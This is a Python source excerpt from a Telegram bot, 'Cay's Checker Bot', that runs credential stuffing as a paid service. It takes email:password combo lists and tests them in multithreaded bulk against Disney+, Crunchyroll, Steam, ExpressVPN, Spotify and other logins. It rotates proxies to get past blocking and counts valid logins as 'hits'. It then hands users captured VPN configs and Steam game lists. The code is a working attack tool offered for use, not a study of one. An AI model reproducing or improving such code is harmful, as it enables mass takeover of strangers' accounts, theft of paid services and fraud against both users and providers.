        'expiry': data.get('expire_date', 'N/A'),
        'expire_date': data.get('expire_date', 'N/A'),
        'days_left': str(data.get('days_left', 'N/A')),
        'auto_renew': 'Yes' if data.get('auto_renew') else 'No',
        'payment_method': data.get('payment_method', 'N/A'),
        'license': data.get('license', 'N/A'),
        'ovpn_user': data.get('ovpn_user', 'N/A'),
        'ovpn_pass': data.get('ovpn_pass', 'N/A'),
        'pptp_user': data.get('pptp_user', 'N/A'),
        'pptp_pass': data.get('pptp_pass', 'N/A'),
        'ovpn_path': raw_result.get('ovpn_path'),
    }

# ============= DISNEY+ CHECKER WRAPPER =============
def check_disneyplus(email: str, password: str, proxy_url=None, user_id: int = None, live_status: list = None):
    try:
        from disney_checker import check_account as disney_check

        # Check if proxy is enabled for this user
        raw = None
        for attempt in range(3):
            current_proxy = proxy_url
            # Show live proxy info in Telegram progress message
            if live_status is not None and current_proxy:
                short = current_proxy.split("://")[-1][:35]
                if attempt == 0:
                    live_status[0] = f"🌐 Using proxy: <code>{short}</code>"
                else:
                    live_status[0] = f"🔄 Retry {attempt}/3 — prev proxy failed\n🌐 Trying: <code>{short}</code>"
            raw = disney_check(email, password, current_proxy)

            reason = raw.get('reason', '')
            if raw.get('status') == 'ERROR' and (
                'Forbidden' in reason or
                'device-token' in reason or
                'network' in reason.lower()
            ):
                print(f"[Disney+] Proxy failed ({current_proxy}), retrying... ({attempt+1}/3)")
                if live_status is not None:
                    short = current_proxy.split("://")[-1][:35] if current_proxy else "none"
                    live_status[0] = f"⚠️ Retry {attempt+1}/3 — <code>{short}</code> dead, switching..."
                if current_proxy:
                    remove_disney_proxy(user_id, current_proxy)
                proxy_url = get_next_disney_proxy(user_id)
                if not proxy_url:
                    print("[Disney+] Proxy pool empty — stopping retries")
                    if live_status is not None:
                        live_status[0] = "⚠️ Proxy pool empty — direct connection"
                    break
                continue
            break

        status = raw.get('status')
        plan_line = raw.get('plan', '')
        fields = {}
        for part in plan_line.split(' | '):
            if ' = ' in part:
                k, v = part.split(' = ', 1)
                fields[k.strip()] = v.strip()

        plan_name = fields.get('Plan', 'Unknown').strip('[]')
        country   = fields.get('Country', 'N/A')

        message = ''
        if status == 'BAD':
            message = 'Invalid credentials'
        elif status == 'ERROR':
            raw_reason = raw.get('reason') or 'Check failed'
            # Show clean message to user, log full error to console
            if 'Forbidden' in raw_reason or 'device-token' in raw_reason:
                message = 'Proxy blocked by Disney+ — try again later'
            elif 'throttled' in raw_reason:
                message = 'Rate limited — try again in a few minutes'
            elif 'network' in raw_reason.lower() or 'urlopen' in raw_reason.lower():
                message = 'Network error — proxy connection failed'
            elif 'token' in raw_reason.lower():
                message = 'Authentication failed — try again'
            else:
                message = html.escape(raw_reason[:100])
            # Always log full error for debugging
            print(f"[Disney+] Full error: {raw_reason}")

        return {
            'email':             email,
            'password':          password,
            'success':           status == 'HIT',
            'message':           message,
            'status':            status,
            'has_plan':          raw.get('has_plan', False),
            'plan':              plan_name,
            'country':           country,
            'EmailVerified':     fields.get('EmailVerified', 'Unknown'),
            'Free Trial':        fields.get('Free Trial', 'false'),
            'Next Renewal Date': fields.get('Next Renewal Date', 'N/A'),
            'expiry':            fields.get('Next Renewal Date', 'N/A'),
        }

    except Exception as e:
        return {
            'email':   email,
            'password': password,
            'success': False,
            'message': f"Disney+ Error: {str(e)[:100]}",
        }

async def start(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return

    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    stats = get_user_stats(user_id)

    # Notify admin about new user (only once)
    if stats.get('total_scans', 0) == 0:
        asyncio.create_task(notify_admin_new_user(context, user_id, stats))

    # Update username/first_name if missing
    if not stats.get('username') and username:
        update_user_stats(user_id, {"username": username, "first_name": first_name})
    
    reset_daily_if_needed(stats, user_id)
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)

    # File statistics for dashboard
    max_files = limits.get("multi_scan_max_files", 1)
    today_files = stats.get("today_files", 0)

    files_display = format_files_display(today_files, max_files, stats.get("plan", "FREE"))
    
    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🛠️ Admin Panel", callback_data="open_admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)

    plan = stats.get("plan", "FREE").upper()

    if plan == "FREE":
        combo_section = """📤 <b>Send a single combo to check:</b>
    <i>Format: email:password</i>"""
    else:
        combo_section = """📤 <b>Send your combo list (.txt file)</b>
    <i>Format: mail:pass (one per line)</i>"""

    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_proxyless_banner(stats.get("proxy_enabled", False) if user_id != ADMIN_ID else is_global_proxy_enabled(), get_pool_size(user_id))}
{combo_section}
━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
📁 Files Today: <code><b>{files_display}</b></code>
👑 Plan: <code><b>{get_plan_with_emoji(stats.get('plan'))}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']} combos</b></code>
📡 Mode: <code><b>{get_mode_display(stats.get('api_mode'))}</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    context.user_data['in_main_menu'] = True

    await safe_send(update.message.reply_text(
        welcome,
        parse_mode='HTML',
        reply_markup=reply_markup,
        reply_to_message_id=update.message.message_id
    ))

async def process_thread_count_input(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    try:
        new_threads = int(text)
        stats = get_user_stats(user_id)
        limits = get_plan_limits(stats)
        max_allowed = limits["max_threads"]
        plan_name = limits["display_name"]

        if 1 <= new_threads <= max_allowed:
            # Update in database
            update_user_stats(user_id,{
                "threads": new_threads
            })
            
            # Show confirmation
            await update.message.reply_text(
                f"✅ <b>Thread count updated to {new_threads} for your account.</b>",
                parse_mode='HTML'
            )
            
            # Clear waiting state
            context.user_data['waiting_for_threads'] = False
            
            # Redirect back to main menu
            await edit_to_main_menu(update, context)
            
        else:
            await update.message.reply_text(
                f"❌ Your plan <b>{get_plan_with_emoji(stats.get('plan'))}</b> allows a maximum of <b>{max_allowed}</b> threads.",
                parse_mode='HTML'
            )
            return

    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number! Send a number only.",
            parse_mode='HTML'
        )
        return

async def handle_message(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return
    
    user_id = update.effective_user.id  # ← get once, use everywhere

    if context.user_data.get('waiting_for_threads'):
        await process_thread_count_input(update, context)
        return
    
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    text = update.message.text.strip()
    looks_like_combo = ':' in text

    # Admin broadcast handler
    if user_id == ADMIN_ID and context.user_data.get('waiting_for_broadcast'):
        context.user_data['waiting_for_broadcast'] = False
        try:
            users = supabase.table("user_stats").select("user_id").execute()
            sent = 0
            for user in users.data:
                try:
                    await context.bot.send_message(chat_id=user["user_id"], text=text, parse_mode='HTML')
                    sent += 1
                    await asyncio.sleep(0.35)
                except:
                    continue
            await update.message.reply_text(f"✅ Broadcast sent to <b>{sent}</b> users.", parse_mode='HTML')
        except Exception as e:
            await update.message.reply_text(f"❌ Broadcast failed: {e}")
        return

    # 🔥 NEW: Only trigger single checker when on the main dashboard
    if is_on_main_menu:
        if looks_like_combo:
            parts = text.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()

            stats = get_user_stats(user_id)
            reset_daily_if_needed(stats, user_id)
            stats = get_user_stats(user_id)
            limits = get_plan_limits(stats)
            
            if limits["daily_limit"] is not None:
                if stats["today_scans"] + 1 > limits["daily_limit"]:
                    await update.message.reply_text(
                        f"<b>❌ Daily limit reached!</b>\n\n"
                        f"You have already used <b>{stats['today_scans']}/{limits['daily_limit']}</b> scans today.\n"
                        f"Upgrade your plan or wait until tomorrow.",
                        parse_mode='HTML'
                    )
                    return
                
            # ====================== RATE LIMITER FOR SINGLE CHECKS ======================
            # Same logic as bulk files
            mode_name = stats.get("api_mode", "Crunchyroll")
            if mode_name == "Steam":
                max_rps = 3 if limits["display_name"] == "FREE" else 5 if "BASIC" in limits["display_name"] else 8
            elif limits["display_name"] == "FREE":
                max_rps = 20
            elif "BASIC" in limits["display_name"]:
                max_rps = 40
            else:
                max_rps = 80

            rate_limiter = RateLimiter(max_rps=max_rps)
            rate_limiter.acquire()   # ← This was missing!
            
            live_status = [""]

            # Use correct checker based on user's selected mode
            mode = stats.get("api_mode", "Crunchyroll")

            if not is_mode_enabled(mode) and user_id != ADMIN_ID:
                await update.message.reply_text(
                    f"🔴 <b>{mode} Mode</b> is currently offline.",
                    parse_mode='HTML'
                )
                return

            # Build proxy status line
            if user_id == ADMIN_ID:
                _px_on = is_global_proxy_enabled()
            else:
                _px_on = stats.get("proxy_enabled", False)
            _pool = get_pool_size(user_id)

            # Guard 2: Disney+ specific — always needs proxies regardless of toggle
            if mode == "Disney+" and _pool == 0 and user_id != ADMIN_ID:
                await update.message.reply_text(
                    "🏰 <b>Disney+ requires proxies to work.</b>\n\n"
                    "Your proxy pool is currently empty.\n\n"
                    "1️⃣ Go to <b>Settings → Proxy Manager</b> and upload residential proxies\n"
                    "2️⃣ Or switch to a different mode (Crunchyroll, Steam, etc.)\n\n"
                    "<i>⚠️ Disney+ blocks direct connections — residential proxies required.</i>",
                    parse_mode='HTML'
                )
                return

            # Put this BEFORE status_msg, right after the Disney+ guard:
            if _px_on and _pool == 0 and user_id != ADMIN_ID:
                await update.message.reply_text(
                    "⚠️ <b>Proxy is ON but your pool is empty.</b>\n\n"
                    "You have two options:\n"
                    "1️⃣ Go to <b>Settings → Proxy Manager</b> and upload a proxy list\n"
                    "2️⃣ Or turn proxy <b>OFF</b> to check directly without a proxy\n\n"
                    "<i>Tip: Disney+ requires residential proxies to work.</i>",
                    parse_mode='HTML'
                )
                return

            if _px_on and _pool > 0:
                proxy_line = f"🌐 <b>Proxy:</b> <code>ON ✅ ({_pool} proxies in pool)</code>\n"
            elif _px_on and _pool == 0:
                proxy_line = f"🌐 <b>Proxy:</b> <code>ON ⚠️ (pool empty — using direct)</code>\n"
            else:
                proxy_line = f"🌐 <b>Proxy:</b> <code>OFF — Direct connection</code>\n"
            status_msg = await update.message.reply_text(
                f"🔍 <b>Checking Account</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📧 <code>{email}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{proxy_line}"
                f"📌 🔍 Connecting to server...\n"
                f"⚡ Progress: <b>0%</b>",
                parse_mode='HTML'
            )
            try:
                stop_event = asyncio.Event()

                # Run progress animation + checker at the same time
                progress_task = asyncio.create_task(
                    animate_progress(status_msg, email, stop_event, proxy_line=proxy_line, live_status=live_status)
                )
                
                checker = get_checker_function(mode, user_id, live_status=live_status)
                result = await run_blocking(checker, email, password)
                
                # Stop the animation
                stop_event.set()
                progress_task.cancel()
                
                # Show 100% briefly before result
                await status_msg.edit_text(
                    f"🔍 <b>Checking Account</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📧 <code>{email}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Done!\n"
                    f"⚡ Progress: <b>100%</b>",
                    parse_mode='HTML'
                )
                await asyncio.sleep(0.5)

                # Get current user's plan + mode
                stats = get_user_stats(user_id)
                user_plan = stats.get("plan", "FREE").upper()
                mode = stats.get("api_mode", "Crunchyroll")

                response = format_single_result(result, user_plan, mode)
                await status_msg.edit_text(response, parse_mode='HTML')

                # === AUTO SEND OVPN FILE AFTER HIT ===
                if mode == "ExpressVPN" and result.get('success'):
                    ovpn_path = result.get('ovpn_path')
                    if ovpn_path and os.path.exists(ovpn_path) and user_plan != "FREE":
                        try:
                            await update.message.reply_document(
                                document=open(ovpn_path, "rb"),
                                filename=f"ExpressVPN - {result['email']} By @caydigitals.ovpn",
                                caption="🔑 <b>Ready-to-import ExpressVPN .ovpn config</b>\n"
                                        "Just import this file into OpenVPN, Viscosity, or OpenVPN Connect app.",
                                parse_mode='HTML',
                                reply_to_message_id=status_msg.message_id
                            )
                        except Exception as e:
                            print(f"Failed to send OVPN: {e}")

                # === SEND PROFILE PICTURE FOR WEBTOON HIT ===
                if mode == "Webtoon" and result.get('profileUrl'):
                    try:
                        await context.bot.send_photo(
                            chat_id=update.effective_chat.id,
                            photo=result['profileUrl'],
                            caption="🖼️ <b>Webtoon Profile Picture</b>",
                            parse_mode='HTML',
                            reply_to_message_id=status_msg.message_id
                        )
                    except:
                        pass  # if image fails to load, don't crash

                # Notify owner about new Custom Plans
                if mode == "Vivamax" and "Custom Plan" in result.get('plan', ''):
                    await notify_admin_custom_plan(context, result, user_id, is_bulk=False)

                # Send Steam games file if applicable (VIP/YEARLY/OWNER only)
                if mode == "Steam" and result.get('success') and result.get('games') and user_plan in ["VIP", "YEARLY", "OWNER"]:
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    games_file = create_steam_games_file(result, user_plan, timestamp)
                    
                    if games_file:
                        total_games = result.get('total_games_owned', result.get('games_count', len(result['games'])))  # ✅ fixed
                        total_playtime_display = result.get('total_playtime_display', f"{result.get('total_playtime', 0):,}h")
                        
                        await update.message.reply_document(
                            document=open(games_file, "rb"),
                            filename=f"Steam Games - {result['email']} By @caydigitals.txt",
                            caption=(
                                f"🎮 <b>Full Games List</b>\n"
                                f"──────────────────────\n"
                                f"🆔 <code>{result.get('steamid', 'N/A')}</code>\n"
                                f"🎮 Total Games: <b>{total_games}</b>\n"
                                f"⏳ Total Playtime: <b>{total_playtime_display}</b>\n"
                                f"──────────────────────\n"
                                f"☰ BY @caydigitals ✅\n"
                                f"──────────────────────\n"
                                f"<a href='https://t.me/clydecrunchybot'>BOT</a> | <a href='https://t.me/caysredirect'>Channel</a>"
                            ),
                            parse_mode='HTML'
                        )

            except Exception as e:
                await status_msg.edit_text(
                    f"❌ <b>Check Failed</b>\n\n"
                    f"📧 <b>Account:</b> <code>{email}</code>\n"
                    f"⚠️ <b>Error:</b> <code>{str(e)[:100]}</code>\n\n"
                    f"Please try again.",
                    parse_mode='HTML'
                )
                print(f"[ERROR] format_single_result crashed: {e}")
                return
            
            # AUTO PIN THE RESULT
            await manage_result_pin(update, context, status_msg.message_id)
            
            hits_increment = 1 if result.get('success') else 0
            bad_increment = 1 if not result.get('success') else 0
            twofa_increment = 1 if result.get('twofa') else 0

            update_user_stats(user_id, {
                "total_scans": stats.get("total_scans", 0) + 1,
                "total_hits": stats.get("total_hits", 0) + hits_increment,
                "total_free": stats.get("total_free", 0) + bad_increment,
                "total_2fa": stats.get("total_2fa", 0) + twofa_increment,
                "today_scans": stats.get("today_scans", 0) + 1
            })
            return
        else:
            await update.message.reply_text(
                """❌ <b>Invalid Format!</b>
    ━━━━━━━━━━━━━━━━━━━━━━━━
    Send like this:
    <code>email:password</code>
    <b>Example:</b>
    <code>user@example.com:supersecret123</code>
    ━━━━━━━━━━━━━━━━━━━━━━━━
    💡 You can also send a <b>.txt file</b> with multiple accounts (one per line).""",
                parse_mode='HTML'
            )
            return
    else:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return

async def handle_document(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return

    # ← ADD THIS: Prevent Telegram retry duplicates
    update_id = update.update_id
    if context.bot_data.get(f'processing_{update_id}'):
        return
    context.bot_data[f'processing_{update_id}'] = True

    document = update.message.document
    user_id = update.effective_user.id

    # ============= PROXY FILE UPLOAD (check BEFORE main menu check) =============
    if document.file_name.endswith('.txt') and context.user_data.get('waiting_for_proxy_file'):
        context.user_data['waiting_for_proxy_file'] = False

        from fetch_disney_proxies import load_proxies_from_text, set_uploaded_proxies, get_proxy_type_summary

        status_msg = await update.message.reply_text(
            "🌐 <b>Loading proxy list...</b>",
            parse_mode='HTML'
        )

        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        text = file_content.decode("utf-8", errors="ignore")

        proxies = load_proxies_from_text(text)
        count = set_uploaded_proxies(user_id, proxies)
        type_summary = get_proxy_type_summary(user_id)

        if count == 0:
            await status_msg.edit_text(
                "❌ <b>No valid proxies found in file.</b>\n\n"
                "Make sure your file has one proxy per line.\n\n"
                "Supported formats:\n"
                "<code>ip:port</code>\n"
                "<code>user:pass@ip:port</code>\n"
                "<code>http://ip:port</code>\n"
                "<code>socks4://ip:port</code>\n"
                "<code>socks5://user:pass@ip:port</code>",
                parse_mode='HTML'
            )
            return

        await status_msg.edit_text(
            f"✅ <b>Proxy list uploaded!</b>\n\n"
            f"🌐 <b>Loaded:</b> <code>{count}</code> proxies\n"
            f"📊 <b>Types:</b> <code>{type_summary}</code>\n\n"
            f"Proxies are now active in the pool.\n\n"
            f"<i>Opening Proxy Manager...</i>",
            parse_mode='HTML'
        )
        await asyncio.sleep(1.5)

        # Auto-navigate to Proxy Manager without needing /start
        class _MsgShim:
            """Wraps a sent Message so show_proxy_manager() can edit it."""
            def __init__(self, msg, uid):
                self._msg = msg
                self.from_user = type("_u", (), {"id": uid})()
            async def edit_message_text(self, *args, **kwargs):
                return await self._msg.edit_text(*args, **kwargs)
            async def answer(self, *args, **kwargs):
                pass

        await show_proxy_manager(_MsgShim(status_msg, user_id), context)
        return
    # ============= END PROXY FILE UPLOAD =============

    is_on_main_menu = context.user_data.get('in_main_menu', False)

    if not is_on_main_menu:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ Please send a .txt file only!", 
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return
    
    user_id = update.effective_user.id
    
    # ==================== BLOCK BULK UPLOAD FOR FREE PLAN ====================
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)

    if limits["display_name"] == "FREE":
        await update.message.reply_text(
            f"❌ <b>FREE Plan Limitation</b>\n\n"
            f"Bulk checking (.txt files) is only available for <b>BASIC + VIP</b> plans.\n\n"
            f"✅ You can still do <b>single checks</b> (email:password)\n"
            f"👑 Upgrade for unlimited bulk scanning!",
            parse_mode='HTML'
        )
        return
    # =====================================================================

    # Paid users (BASIC+) continue with normal file limit check
    max_files = limits.get("multi_scan_max_files", 1)
    reset_daily_if_needed(stats, user_id)
    stats = get_user_stats(user_id)

    if stats.get("today_files", 0) >= max_files:
        await update.message.reply_text(
            f"❌ <b>Daily file limit reached!</b>\n\n"
            f"Your <b>{limits['display_name']}</b> plan allows only <b>{max_files}</b> file{'' if max_files == 1 else 's'} per day.\n\n"
            f"Come back tomorrow or upgrade your plan.",
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return
    
    # ====================== Normal file processing ======================
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').splitlines()

    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append((email.strip(), pwd.strip()))
    
    if not accounts:
        await update.message.reply_text(
            "❌ No valid accounts found!", 
            parse_mode='HTML',
            reply_to_message_id=update.message.message_id
        )
        return

    total = len(accounts)

    # Daily scan limit check
    if limits["daily_limit"] is not None:
        used = stats.get("today_scans", 0)
        remaining = limits["daily_limit"] - used
        if total > remaining:
            await update.message.reply_text(
                f"❌ <b>Error!</b> Maximum allowed combos per day for your plan is <code>{remaining}</code>. Your file contains <code>{total}</code> combos.",
                parse_mode='HTML',
                reply_to_message_id=update.message.message_id
            )
            return

    # Increment counters
    update_user_stats(user_id, {"today_files": stats.get("today_files", 0) + 1})
    update_user_stats(user_id, {"total_combo_files": stats.get("total_combo_files", 0) + 1})
        
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    user_threads = limits["current_threads"]

    mode_name = stats.get("api_mode", "Crunchyroll")
    
    # ←←← ADD THIS PROTECTION (same as single check)
    if not is_mode_enabled(mode_name) and user_id != ADMIN_ID:
        await update.message.reply_text(
            f"🔴 <b>{mode_name} Mode</b> is currently offline.",
            parse_mode='HTML'
        )
        return

    if mode_name == "Disney+" and get_pool_size(user_id) == 0 and user_id != ADMIN_ID:
        await update.message.reply_text(
            "⚠️ <b>Disney+ proxy pool is empty.</b>\nPlease upload proxies first.",
            parse_mode='HTML'
        )
        return

    # ====================== NEW PROGRESS FORMAT (your requested design) ======================

    scan_id = str(uuid.uuid4())[:8]
    context.user_data['current_scan'] = {
        'scan_id': scan_id,
        'progress_msg': None,
        'stop_requested': False
    }

    # 3 buttons in ONE clean row
    keyboard = [[
        InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # === YOUR EXACT REQUESTED PROGRESS MESSAGE ===
    progress_msg = await update.message.reply_text(
        f"📊 <b>Scan In Progress</b> 🔄\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 File: <code>{document.file_name}</code>\n"
        f"🔢 <b>Processed:</b> <code>0/{total}</code> (<code>0%</code>)\n"
        f"🧵 <b>Threads:</b> <code>{user_threads}</code>\n"
        f"📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Hits:</b> <code>0</code>\n"
        f"❌ Bad: <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ <b>Elapsed:</b> <code>00m 00s</code>\n"
        f"⚡ <b>CPM:</b> <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"— Controls:\n"
        f"Pause\n"
        f"Resume\n"
        f"Stop and send results\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode='HTML',
        reply_markup=reply_markup
    )
    context.user_data['current_scan']['progress_msg'] = progress_msg

    set_scan_status(scan_id, "running")

    # ====================== Start scanning ======================
    hits = []
    processed_accounts_list = []  # ← ADD
    start_time = time.time()

    mode_name = stats.get("api_mode", "Crunchyroll")
    if mode_name == "Steam":
        max_rps = 8 if limits["display_name"] == "FREE" else 12 if "BASIC" in limits["display_name"] else 18
    elif limits["display_name"] == "FREE":
        max_rps = 20
    elif "BASIC" in limits["display_name"]:
        max_rps = 40
    else:
        max_rps = 80

    rate_limiter = RateLimiter(max_rps=max_rps)

    # ── Resolve proxy preference ONCE (no DB call per thread) ──
    _mode = stats.get("api_mode", "Crunchyroll")
    if user_id == ADMIN_ID:
        _proxy_on = is_global_proxy_enabled()
    else:
        _proxy_on = stats.get("proxy_enabled", False)

    def _get_proxy():
        if not _proxy_on:
            return None
        return get_next_disney_proxy(ADMIN_ID if user_id == ADMIN_ID else user_id)

    def _build_checker(proxy_url):
        return {
            "Crunchyroll": lambda e, p: check_crunchyroll(e, p, proxy_url),
            "Vivamax":     lambda e, p: check_vivamax(e, p, proxy_url),
            "Steam":       lambda e, p: check_steam(e, p, proxy_url),
            "ExpressVPN":  lambda e, p: check_expressvpn(e, p, proxy_url),
            "Disney+":     lambda e, p: check_disneyplus(e, p, proxy_url=proxy_url, user_id=user_id),
            "Webtoon":     lambda e, p: check_webtoon(e, p, proxy_url=proxy_url),
            "Spotify":     lambda e, p: check_spotify(e, p, proxy_url),
        }.get(_mode, lambda e, p: check_crunchyroll(e, p, proxy_url))

    # ── Shared task queue (deque) — same pattern as other bot ──
    from collections import deque as _deque
    account_deque = _deque(accounts)
    # Define loop + async queue BEFORE worker_thread so workers can use them
    loop = asyncio.get_running_loop()
    async_result_queue = asyncio.Queue()

    def worker_thread():
        """Pull one task at a time — check stop BEFORE each task, just like other bot."""
        while True:
            # Check stop BEFORE pulling next account (this is why other bot stops instantly)
            if get_scan_status(scan_id) in ("stopped",):
                break
            # Wait while paused
            pause_start = time.time()
            while get_scan_status(scan_id) == "paused":
                if get_scan_status(scan_id) == "stopped":
                    break
                if time.time() - pause_start > 600:
                    set_scan_status(scan_id, "stopped")
                    break
                time.sleep(0.1)
            if get_scan_status(scan_id) == "stopped":
                break
            # Pull next account from shared deque
            try:
                acc = account_deque.popleft()
            except IndexError:
                break  # No more accounts, this worker is done
            # Rate limit
            rate_limiter.acquire()
            if get_scan_status(scan_id) == "stopped":
                break
            # Run the check
            email, pwd = acc
            proxy_url = _get_proxy()
            checker = _build_checker(proxy_url)
            result = checker(email, pwd)
            loop.call_soon_threadsafe(async_result_queue.put_nowait, result)
        loop.call_soon_threadsafe(async_result_queue.put_nowait, None)  # done signal

    # Launch N worker threads
    worker_threads = []
    for _ in range(user_threads):
        t = threading.Thread(target=worker_thread, daemon=True)
        t.start()
        worker_threads.append(t)

    completed = 0
    done_workers = 0
    last_edit_time = time.time()

    # Async result collector — zero polling overhead.
    # Workers push via call_soon_threadsafe; we await until data arrives.
    while done_workers < user_threads:
        scan_status = get_scan_status(scan_id)

        try:
            item = await asyncio.wait_for(async_result_queue.get(), timeout=0.5)
        except asyncio.TimeoutError:
            # No result yet — just loop to re-check scan status
            continue

        if item is None:
            # One worker finished
            done_workers += 1
            continue

        result = item

        # Wait while paused before counting
        while True:
            scan_status = get_scan_status(scan_id)
            if scan_status in ("running", "stopped"):
                break
            await asyncio.sleep(0.5)

        if scan_status == "stopped":
            # Drain remaining None signals so threads can fully exit
            remaining_nones = user_threads - done_workers
            for _ in range(remaining_nones):
                try:
                    await asyncio.wait_for(async_result_queue.get(), timeout=5)
                except asyncio.TimeoutError:
                    pass
            break

        completed += 1

        if result and result.get('success'):
            hits.append(result)

        if result is None:
            continue

        # === AUTO SAVE OVPN FOR EXPRESSVPN IN BULK ===
        if mode_name == "ExpressVPN":
            ovpn_path = result.get('ovpn_path')
            if ovpn_path and os.path.exists(ovpn_path):
                pass

        # Notify owner about new Custom Plans
        if mode_name == "Vivamax" and "Custom Plan" in result.get('plan', ''):
            await notify_admin_custom_plan(context, result, user_id, is_bulk=True)

        _now = time.time()
        if _now - last_edit_time >= 2 or completed == total:
            last_edit_time = _now
            current_status = get_scan_status(scan_id)
            if current_status == "paused":
                pass
            else:
                elapsed_sec = int(time.time() - start_time)
                cpm = int((completed / elapsed_sec) * 60) if elapsed_sec > 0 else 0
                percent = int((completed / total) * 100)
                bad_so_far = completed - len(hits)

                if 'current_scan' in context.user_data and context.user_data['current_scan'].get('scan_id') == scan_id:
                    context.user_data['current_scan']['last_progress'] = {
                        'file_name': document.file_name,
                        'completed': completed,
                        'total': total,
                        'hits': len(hits),
                        'bad': bad_so_far,
                        'elapsed_sec': elapsed_sec,
                        'cpm': cpm,
                        'percent': percent,
                        'threads': user_threads,
                        'mode': get_mode_display(stats.get('api_mode'))
                    }

                current_status = get_scan_status(scan_id)
                if current_status == "paused":
                    status_title = "📊 <b>Scan Paused</b> ⏸️"
                    keyboard = [[
                        InlineKeyboardButton("▶️ Resume", callback_data=f"resume_scan:{scan_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
                    ]]
                else:
                    status_title = "📊 <b>Scan In Progress</b> 🔄"
                    keyboard = [[
                        InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
                        InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
                    ]]

                reply_markup = InlineKeyboardMarkup(keyboard)

                try:
                    await progress_msg.edit_text(
                        f"{status_title}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📁 File: <code>{document.file_name}</code>\n"
                        f"🔢 <b>Processed:</b> <code>{completed}/{total}</code> (<code>{percent}%</code>)\n"
                        f"🧵 <b>Threads:</b> <code>{user_threads}</code>\n"
                        f"📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ <b>Hits:</b> <code>{len(hits)}</code>\n"
                        f"❌ Bad: <code>{bad_so_far}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏱ <b>Elapsed:</b> <code>{elapsed_sec//60:02d}m {elapsed_sec%60:02d}s</code>\n"
                        f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"— Controls:\n"
                        f"Pause\n"
                        f"Resume\n"
                        f"Stop and send results\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━",
                        parse_mode='HTML',
                        reply_markup=reply_markup
                    )
                except:
                    pass

    # ====================== CLEANUP & FINISH ======================
    final_status = get_scan_status(scan_id)
    hits_count = len(hits)
